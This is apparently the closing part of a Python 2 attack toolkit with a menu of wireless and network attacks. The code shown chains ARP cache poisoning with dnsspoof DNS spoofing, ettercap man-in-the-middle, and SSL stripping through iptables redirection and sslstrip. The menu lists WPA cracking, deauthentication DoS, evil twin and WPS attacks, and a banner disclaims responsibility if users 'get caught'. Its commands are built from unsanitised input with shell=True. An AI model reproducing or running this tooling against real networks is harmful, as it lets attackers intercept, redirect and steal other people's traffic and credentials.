			print colored('Give IP address of your target: ', 'red')
			iptarget2 = raw_input()
			com = 'nslookup ' + iptarget2
			maincom='xterm -hold -e ' + '\'' + com + '\' &'
			subprocess.call(maincom, shell=True)
			print colored('Running Apache Service ...', 'red')
			print colored('Apache Service Processing ...', 'red')
			subprocess.call('service apache2 start', shell=True)
			time.sleep(5)
			print
			print

			print colored('Now define file with information about', 'red')
			print colored('which DNS records we want to falsified', 'red')
			print colored('and where they should be redirect', 'red')
			print

			subprocess.call('touch hosts.txt', shell=True)
			print colored('Give interface you use:', 'red')
			interface = raw_input()
			print colored('Host you attack: ', 'red')
			host = raw_input()
			print colored('False IP: ', 'red')
			false_ip = raw_input()
			megacom='ifconfig ' + interface + ' | grep -w inet | awk \'{print $2}\' > hosts.txt'
			subprocess.call(megacom, shell=True)
			coms='echo ' + host + ' >> hosts.txt'
			subprocess.call(coms, shell=True)
			print
			print colored('Example of looking a hosts.txt file: <Attacker IP> <www.example.com>', 'yellow')
			print
			print

			print colored('ARP Cache Poisoning running:', 'red')
			attack().mitmarpsec(interface, iptarget2, false_ip)
			print colored("Give \'next\' command to continue\n", 'green')
			choice = raw_input()
			if(choice == 'next'):
				print colored('ARP Spoofing Processing ...', 'red')
				time.sleep(hmt)
				com4 = 'dnsspoof -i ' + interface + ' -f hosts.txt'
				commain = 'xterm -hold -e ' + '\'' + com4 + '\' &'
				subprocess.call(commain, shell=True)
				print colored('Give \'next\' command to continue\n', 'green')
				choice2 = raw_input()
				if(choice2 == 'next'):
					com5 = 'nslookup ' + host + ' &'
					commainsec='xterm -hold -e ' + '\'' + com5 + '\' &'
					subprocess.call(commainsec, shell=True)
					print
					print
					time.sleep(5)
		except OSError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!', 'cyan')
			time.sleep(5)
			print
			print

	def mitmssl(self):
		try:
			subprocess.call('clear', shell=True)
			print colored("MitM with SSL", 'green')
			print colored('MitM with SSL Processing ...', 'red')
			print
			print

			print colored('Give name of network interface you use: ', 'red')
			interface = raw_input()
			print colored('Give your address IP: ', 'red')
			ourip = raw_input()
			print colored('Give address IP of the target: ', 'red')
			targetip = raw_input()
			print colored('Give false IP address: ', 'red')
			falseip=raw_input()
			print colored('ARP Cache Poisoning running:', 'red')
                        print colored('ARP Spoofing Poisoning Processing ...', 'red')
                        attack().mitmarpsec(interface, targetip, falseip)
			print colored("Give \'next\' command to continue\n", 'green')
			choice = raw_input()
			if (choice == 'next'):
		                print
		                print

				com = 'ettercap -Ti ' + interface + ' -M arp:/remote/' + ourip + '/' + targetip
				maincom = 'xterm -hold -e ' + '\'' + com + '\' &'
				subprocess.call(maincom, shell=True)
				print
				print
				time.sleep(5)
		except IOError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!', 'cyan')
			time.sleep(5)
                        print
                        print

	def mitmss(self):
		try:
			subprocess.call('clear', shell=True)
			print colored("MitM with SSL Stripping", 'green')
			print colored("MitM with SSL Stripping Processing ...", 'green')
			print
			print
			print colored("MitM with SSL Processing ...", 'green')
			attack().mitmssl()
			print
			print
			print colored('IPTABLES Processing ...', 'red')
			com = 'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080'
			subprocess.call(com, shell=True)
			print colored('sslstrip Processing ...', 'red')
			com1 = 'sslstrip -l 8080'
			com1main = 'xterm -hold -e ' + '\'' + com1 + '\' &'
			subprocess.call(com1main, shell=True)
			time.sleep(5)
			print
			print
		except IOError:
			print colored('Something went wrong!!! Propably you give wrong interface or IP address of the target!!!', 'cyan')
			time.sleep(5)
			print
			print

	def exit(self):
		print colored('\t\t\t\t\t\t\t______	 __        __	 __     __________', 'red')
		print colored('\t\t\t\t\t\t\t| ____|	 \\ \\      / /	|  |   |___    ___|', 'red')
		print colored('\t\t\t\t\t\t\t| |	  \\ \\    / /	|  |       |  |', 'red')
		print colored('\t\t\t\t\t\t\t| |___	   \\ \\__/ /	|  |	   |  |',  'red')
		print colored('\t\t\t\t\t\t\t| ____|	   /  __  \\	|  |	   |  |', 'red')
		print colored('\t\t\t\t\t\t\t| |	  /  /  \\  \\	|  |	   |  |', 'red')
		print colored('\t\t\t\t\t\t\t| |____	 /  /    \\  \\	|  |	   |  |', 'red')
		print colored('\t\t\t\t\t\t\t|_____|	/__/	  \\__\\  |__|	   |__|', 'red')
		print
		print


	def error(self):
		print colored("Error!!! Bad choice", 'green')
		print
		print

#********************************************************************************************************************************************************************************************************************
class options:
	def first(self):
		subprocess.call('clear', shell=True)
		options().logo()
		options().welcome()
		print colored("Choose 1 for: Conf Set Up", 'green')
		print colored("Choose 2 for: MitM Attacks", 'green')
		print colored("Choose 3 for: Packet Injection", 'green')
		print colored("Choose 4 for: See packets of the target router", 'green')
		print colored("Choose 5 for: Disclosure of hidden network SSIDs", 'green')
		print colored("Choose 6 for: Bypassing MAC address filtering", 'green')
		print colored("Choose 7 for: Connecting to an access point with open access", 'green')
		print colored("Choose 8 for: Bypassing authentication with a shared key", 'green')
		print colored("Choose 9 for: Breaking weak passwords in networks with WPA-PSK encryption", 'green')
		print colored("Choose 10 for: Acceleration of breaking WPA / WPA2 PSK encryption", 'green')
		print colored("Choose 11 for: Decryption of WEP and WPA packages", 'green')
		print colored("Choose 12 for: Connecting to a network using WEP encryption", 'green')
		print colored("Choose 13 for: Connecting to a network using WPA encryption", 'green')
		print colored("Choose 14 for: DoS kind of cancelling of authentication", 'green')
		print colored("Choose 15 for: Bad Twin", 'green')
		print colored("Choose 16 for: Nonauthentication Access Point", 'green')
		print colored("Choose 17 for: Misassociation attacks", 'green')
		print colored("Choose 18 for: Caffe Latte attack", 'green')
		print colored("Choose 19 for: Client Deauthentication for WEP or WPA/WPA2", 'green')
		print colored("Choose 20 for: Deauthentication - Hirte", 'green')
		print colored("Choose 21 for: Breaking WPA PSK key without access point", 'green')
		print colored("Choose 22 for: FreeRadius Installation", 'green')
		print colored("Choose 23 for: FreeRadius configuration", 'green')
		print colored("Choose 24 for: Breaking PEAP", 'green')
		print colored("Choose 25 for: WPS Attack", 'green')
		print colored("Choose 26 for: Listening for Attempts to probe the network", 'green')
		print colored("Choose 27 for: Exiting", 'green')

		myobj = mitmattack()
		myobj2 = conf()
		myobj3 = packetinjection()
		myobj4 = tdfr()
		myobj5 = DoHNSSID()
		myobj6 = BMAF()
		myobj8 = BAwaSK()
		myobj9 = BWPiNwWPE()
		myobj10 = AoBWWPSKE()
		myobj11 = DPWW()
		myobj12 = ADoSCA()
		myobj13 = BadTwin()
		myobj14 = NAAP()
		myobj15 = MA()
		myobj16 = CLA()
		myobj17 = DCfW()
		myobj18 = HIRTE()
		myobj19 = BWPAwAP()
		myobj20 = IFR()
		myobj21 = CFR()
		myobj22 = BPEAP()
		myobj23 = WPSA()
		myobj24 = LAPN()

		while(1):
			choice = raw_input()
			subprocess.call('clear', shell=True)
			print colored("Choose 1 for: Conf Set Up", 'green')
		        print colored("Choose 2 for: MitM Attacks", 'green')
		        print colored("Choose 3 for: Packet Injection", 'green')
		        print colored("Choose 4 for: See packets of the target router", 'green')
		        print colored("Choose 5 for: Disclosure of hidden network SSIDs", 'green')
		        print colored("Choose 6 for: Bypassing MAC address filtering", 'green')
		        print colored("Choose 7 for: Connecting to an access point with open access", 'green')
		        print colored("Choose 8 for: Bypassing authentication with a shared key", 'green')
		        print colored("Choose 9 for: Breaking weak passwords in networks with WPA-PSK encryption", 'green')
		        print colored("Choose 10 for: Acceleration of breaking WPA / WPA2 PSK encryption", 'green')
		        print colored("Choose 11 for: Decryption of WEP and WPA packages", 'green')
		        print colored("Choose 12 for: Connecting to a network using WEP encryption", 'green')
		        print colored("Choose 13 for: Connecting to a network using WPA encryption", 'green')
		        print colored("Choose 14 for: DoS kind of cancelling of authentication", 'green')
		        print colored("Choose 15 for: Bad Twin", 'green')
		        print colored("Choose 16 for: Nonauthentication Access Point", 'green')
		        print colored("Choose 17 for: Misassociation attacks", 'green')
		        print colored("Choose 18 for: Caffe Latte attack", 'green')
		        print colored("Choose 19 for: Client Deauthentication for WEP or WPA/WPA2", 'green')
		        print colored("Choose 20 for: Deauthentication - Hirte", 'green')
		        print colored("Choose 21 for: Breaking WPA PSK key without access point", 'green')
		        print colored("Choose 22 for: FreeRadius Installation", 'green')
		        print colored("Choose 23 for: FreeRadius configuration", 'green')
		        print colored("Choose 24 for: Breaking PEAP", 'green')
		        print colored("Choose 25 for: WPS Attack", 'green')
		        print colored("Choose 26 for: Listening for Attempts to probe the network", 'green')
		        print colored("Choose 27 for: Exiting", 'green')

			if (choice == '1'):
				myobj2.info()
				myobj2.config()
				subprocess.call('clear', shell=True)
			if (choice == '2'):
				print colored("Choose 1 for: MitM with ARP Cache Poisoning\n", 'green')
		                print colored("Choose 2 for: MitM with DNS Cache Poisoning\n", 'green')
                		print colored("Choose 3 for: MitM with SSL\n", 'green')
                		print colored("Choose 4 for: MitM with SSL Stripping\n", 'green')
                		print colored("Choose 5 for: Exit", 'green')
				if (choice == '1'):
				        myobj.mitmarpcp()
				if (choice == '2'):
		        		myobj.mitmdcp()
				if (choice == '3'):
				        myobj.mitmssl()
				if (choice == '4'):
				        myobj.mitmss()
				if (choice == '5'):
				        myobj.exit()
					break
				if (choice != '1' and choice != '2' and choice != '3' and choice != '4' and choice != '5'):
				        myobj.error()
					subprocess.call('clear', shell=True)
					print colored("Choose 1 for: MitM with ARP Cache Poisoning\n", 'green')
                        		print colored("Choose 2 for: MitM with DNS Cache Poisoning\n", 'green')
                        		print colored("Choose 3 for: MitM with SSL\n", 'green')
                        		print colored("Choose 4 for: MitM with SSL Stripping\n", 'green')
                        		print colored("Choose 5 for: Exit", 'green')
			if (choice == '3'):
				myobj3.info()
				myobj3.inject()
			if (choice == '4'):
				myobj4.info()
				myobj4.see()
			if (choice == '5'):
				myobj5.info()
				myobj5.dohnssid()
			if (choice == '6'):
				myobj6.info()
				myobj6.bmaf()
			if (choice == '7'):
				ctaapwoa()
			if (choice == '8'):
				myobj8.info()
				myobj8.bawask()
			if (choice == '9'):
				myobj9.info()
				myobj9.bwpinwwpe()
			if (choice == '10'):
				myobj10.info()
				myobj10.aobwwpske()
			if (choice == '11'):
				myobj11.info()
				myobj11.dpww()
			if (choice == '12'):
				ctnuWEP()
			if (choice == '13'):
				ctnuWPA()
			if (choice == '14'):
				myobj12.info()
				myobj12.adosca()
			if (choice == '15'):
				myobj13.info()
				myobj13.badtwin()
			if (choice == '16'):
				myobj14.info()
				myobj14.naap()
			if (choice == '17'):
				myobj15.info()
				myobj15.ma()
			if (choice == '18'):
				myobj16.info()
				myobj16.cla()
			if (choice == '19'):
				myobj17.info()
				myobj17.dcfw()
			if (choice == '20'):
				myobj18.info()
				myobj18.hirte()
			if (choice == '21'):
				myobj19.info()
				myobj19.bwpawap()
			if (choice == '22'):
				myobj20.info()
				myobj20.instfree()
			if (choice == '23'):
				myobj21.info()
				myobj21.cfr()
			if (choice == '24'):
				myobj22.info()
				myobj22.bpeap()
			if (choice == '25'):
				myobj23.info()
				myobj23.wpsa()
			if (choice == '26'):
				myobj24.info()
				myobj24.lapn()
			if (choice == '27'):
				myobj.exit()
				time.sleep(5)
				subprocess.call('clear', shell=True)
				break


	def welcome(self):
		print colored("\t\t\t\t\t\t\tWelcome at Lucifers Ear", 'red')
		print colored("\t\t\t\t\t\t\tCreator: Dawid Wordliczek", 'blue')
		print colored("\t\t\t\t\t\t\tDo what you want.", 'red')
		print colored("\t\t\t\t\t\t\tI'm not your mother to say ", 'red')
		print colored("\t\t\t\t\t\t\twhat you should do!", 'blue')
		print colored("\t\t\t\t\t\t\tSo if you get caught", 'red')
		print colored("\t\t\t\t\t\t\tIt\'s not my problem!", 'blue')
		print
		print
		print colored("\t\t\t\t\t\tRemember your sin will be weighted.", 'red')
		print colored("\t\t\t\t\t\t\tBecause I hear everything.", 'blue')
		print
		print

	def logo(self):
		print colored('\t\t\t\t\t\t\t__	 ______', 'red')
		print colored('\t\t\t\t\t\t\t| |	 | ____|', 'red')
		print colored('\t\t\t\t\t\t\t| |	 | |', 'red')
		print colored('\t\t\t\t\t\t\t| |	 | |___', 'red')
		print colored('\t\t\t\t\t\t\t| |	 | ____|', 'red')
		print colored('\t\t\t\t\t\t\t| |	 | |', 'red')
		print colored('\t\t\t\t\t\t\t| |_____ | |____', 'red')
		print colored('\t\t\t\t\t\t\t|_______||_____|', 'red')
		print
		print

#main
if __name__ == '__main__':
	options().first()
